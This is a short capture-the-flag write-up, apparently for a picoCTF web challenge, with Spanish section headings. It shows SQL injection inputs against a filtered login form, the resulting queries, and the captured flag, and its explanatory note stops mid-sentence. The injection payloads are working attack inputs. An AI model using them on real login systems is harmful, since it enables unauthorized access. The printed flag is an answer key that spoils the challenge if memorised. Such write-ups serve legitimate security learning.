## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Pistas
- The password is being filtered.

## Solución
```
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'

# Login failed.


username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'

# SQLi detected.


username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```

## Notas adicionales
- Se agregaron el or y el igual a la lista de palabras reservadas, pero las comillas no, por tanto podemos ejecutar 

## Referencias

